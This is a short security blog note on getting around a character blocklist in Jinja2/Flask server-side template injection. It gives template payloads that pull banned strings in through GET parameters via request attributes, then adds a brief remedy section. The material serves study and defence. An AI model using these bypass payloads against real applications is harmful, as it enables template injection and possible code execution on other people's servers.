---
title: "Jinja2/Flask SSTI Filter bypass"
author: filip
date: 2024-07-03 10:00:00 0000
categories: [Web Security, Notes]
tags: [Notes, Jinja2, Flask, Filter Bypass]
render_with_liquid: false
---

## Case study
If the following chars are banned from injection ( ```"{{", "}}", ".", "_", "[", "]","\\", "x" ```), it is still possible to perform SSTI, because symbols as `%`, `{`, `}` and `(` , `)` are still accessible.

In Jinja2/Flask it is possible to initialize variables for templates, and deliver payload parts through different methods(i.e., GET parameters, HTTP headers, cookies). This might help avoid filters that expect forbidden values from a certain injection point, not from the whole request itself.

The explanation on how to decide what payload to delive is left outside of this post, and here I just left as a learning note an example how to conduct such a payload. 

### Bypassing a filter.
At first, we need to access the `request` object. If it is accessible, then we need to check if `attr()` method is available. When this condition is met, we start crafting our payload. 
For example we need to send the  `dict.__base__` to access the class object. The following might be performed on this build through delivering `__base__` string that contains banned symbols via HTTP GET parameter in Jinja2/Flask 3.0.* in the following (originally `request.args.get('param_name')`):
```python
{%set base=request|attr('args')|attr('get')('base')%} #here we make a helper
{%with a=dict|attr(base) %}{%print(a)%}{%endwith%} #and use our helper in our initial payload `dict.__base__`
```
then deliver `dict.__base__` sending a request to the page with the stored template like following:
`https://localhost:3000/vulnerable/page?base=__base__ `


The very same method can be used to craft the complete SSTI payload bypassing above mentioned filters. and when you need to pass string not as an attribute but a `('value')` you can do like following:
```python
{%set base=request|attr('args')|attr('get')('base')%} #here we make a helper
{%set value=request|attr('args')|attr('get')('val')%}
{%with a=dict|attr(base)(value) %}{%print(a)%}{%endwith%} #and use our helper 
```
Then call it the very same way:

`https://localhost:3000/vulnerable/page?base=method&val=string-value`

## Remedy

If the use of logicless template engines is not possible and code execution is inevitable, consider blocking the aforementioned patterns, removing potentially dangerous modules, and ensuring that your template environment is deployed in a locked-down container.